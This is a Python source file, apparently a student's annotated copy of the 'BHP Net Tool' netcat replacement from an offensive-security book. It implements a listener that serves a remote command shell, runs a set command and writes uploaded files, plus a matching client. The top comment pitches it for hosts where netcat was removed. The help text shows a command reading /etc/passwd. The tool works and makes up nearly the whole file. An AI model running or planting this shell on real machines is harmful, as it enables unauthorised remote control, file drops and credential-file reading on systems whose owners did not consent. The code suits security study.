#Netcat script in case (more often than not) netcat was removed
import argparse
import socket 
import shlex
import subprocess #interface for process creation and client program interaction
import sys
import textwrap
import threading

def execute(cdm):
    cdm = cdm.strip()
    if not cdm:
        return
    output = subprocess.check_output(shlex.split(cdm), stderr=subprocess.STDOUT)
    #𝗰𝗵𝗲𝗰𝗸_𝗼𝘂𝘁𝗽𝘂𝘁 runs the comand and captures the output
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None): #innit with command line args and buffer
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket (client)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        
    def listen(self):
        self.socket.bind((self.args.target, self.args.port)) #binds target and port
        self.socket.listen(5)
        
        while True: #listen in a loop
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,) #passing connected socket to handle()
            )
            client_thread.start()
    
    def handle(self, client_socket): #reads command line arguments
        if self.args.execute: #Executes command and sends back the output
            output = execute(self.args.execute)
            client_socket.send(output.encode())  
              
        elif self.args.upload: #uploads data to a secified file
            file_buffer = b''        
            while True: #Loop tha tlistens for content on the client socket 
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else: #The loop will go on until no more data is uploaded
                    break
            with open(self.args.upload, 'wb') as f: #Writes the collected info in the file
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
            
        elif self.args.command: #generates a shell
            cdm_buffer = b''
            while True:
                try: 
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cdm_buffer.decode(): #loop that waits for a command
                        cdm_buffer += client_socket.recv(64)
                    #A command is identified when you 'enter', netcat friendly.
                    #Can use the programm on the listener side and use netcat on the sender
                    #add '\n' if ussing Python client
                    response = execute(cdm_buffer.decode()) #sends to execute()
                    if response:
                        client_socket.send(response.encode())
                    cdm_buffer = b''
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()
        
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        #Connect to target and port; if existing buffer, send that first
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True: #Loop to receive data from target
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len<4096: #If no more data, break out of loop
                        break
                if response: #If data, print response data/pause to get input and continue loop
                    print(response)
                    buffer = input('>')
                    buffer += '\n'#See args.command for explanation
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt: #CTRL+C to end the connection
            print('User terminated.')
            self.socket.close()
            sys.exit()
        
    def run(self):
        if self.args.listen: #If listener, call listener method
            self.listen()
        else: #Else, send
            self.send()        

if __name__ == '__main__':
    parser = argparse.ArgumentParser(#creates the command line interface
        description='BHP Net Tool',
        formatter_class= argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 #echo text to port 135
            netcat.py -t 192.168.1.108 -p 5555 #connect to server'''
        )
    )#examples of program usage from --help
    
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    #c, -𝗲 and -𝘂 imply -𝗹 since they are on the listener side
    #the sender side makes the conection to the listener so it 𝗼𝗻𝗹𝘆 𝗻𝗲𝗲𝗱𝘀 -𝘁 𝗮𝗻𝗱 -𝗽 𝘁𝗼 𝗱𝗲𝗳𝗶𝗻𝗲 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 
    args = parser.parse_args()
    if args.listen:#setup as a listener → invoke NetCat with empty buffer
        buffer=''
    else:#else send buffer content from stdin
        buffer=sys.stdin.read()
    
    nc = NetCat(args, buffer.encode())
    nc.run()       

#use <ip a> to get own ip

# 𝗧𝗲𝘀𝘁 𝟭:
# 𝘀𝗲𝗿𝘃𝗲𝗿 → python netcat.py --t 127.0.0.1 -p 5555 -l -c
# 𝗰𝗹𝗶𝗲𝗻𝘁 → python netcat.py --t 127.0.0.1 -p 5555
#       CTRL-D <to send EOD (end of file) marker>
#       la -al <linux command>